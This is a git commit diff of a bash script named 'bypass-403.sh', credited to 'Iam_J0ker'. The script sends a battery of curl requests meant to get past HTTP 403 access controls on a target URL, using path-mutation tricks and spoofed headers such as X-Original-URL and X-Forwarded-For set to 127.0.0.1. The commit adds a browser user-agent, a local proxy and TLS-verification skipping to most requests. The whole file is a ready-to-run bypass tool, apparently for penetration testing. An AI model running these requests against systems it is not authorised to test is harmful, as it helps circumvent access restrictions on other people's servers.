531d78347a7b7fb3b546acc6d8ed28ab3230e383
rzv <51793648+RazviAlex@users.noreply.github.com>
2023-03-07 17:03:23 +0100

    Update bypass-403.sh

--- bypass-403.sh
+++ bypass-403.sh
@@ -3,47 +3,48 @@ figlet Bypass-403
 echo "                                               By Iam_J0ker"
 echo "./bypass-403.sh https://example.com path"
 echo " "
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
 echo "  --> ${1}/${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
 echo "  --> ${1}/%2e/${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
 echo "  --> ${1}/${2}/."
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
 echo "  --> ${1}//${2}//"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
 echo "  --> ${1}/./${2}/./"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
 echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
 echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
 echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
 echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
 echo "  --> ${1} -H X-rewrite-url: ${2}"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
 echo "  --> ${1}/${2}%20"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
 echo "  --> ${1}/${2}%09"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
 echo "  --> ${1}/${2}?"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
 echo "  --> ${1}/${2}.html"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
 echo "  --> ${1}/${2}/?anything"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
 echo "  --> ${1}/${2}#"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
 echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
 echo "  --> ${1}/${2}/*"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
+#updated
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
 echo "  --> ${1}/${2}.php"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
 echo "  --> ${1}/${2}.json"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
+curl -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0" --proxy 192.168.1.16:8082 --insecure -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
 echo "  --> ${1}/${2}  -X TRACE"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
 echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
@@ -51,6 +52,3 @@ curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
 echo "  --> ${1}/${2}..;/"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
 echo "  --> ${1}/${2};/"
-#updated
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
-echo "  --> ${1}/${2} -X TRACE"
